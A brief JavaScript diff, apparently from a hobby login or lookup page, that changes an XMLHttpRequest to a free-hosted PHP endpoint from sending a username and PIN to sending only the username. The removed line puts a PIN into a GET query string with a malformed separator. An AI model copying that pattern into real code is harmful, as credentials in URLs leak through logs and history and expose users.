@@ -23,7 +23,7 @@
                         alert(this.responseText);
                     }
                 };
-                c.open("GET", "https://quanmcpc.000webhostapp.com/parse.php?username=" + a.innerHTML + "?pin=" + b.innerHTML, true);
+                c.open("GET", "https://quanmcpc.000webhostapp.com/parse.php?username=" + a.value, true);
                 c.send();
             }
         }
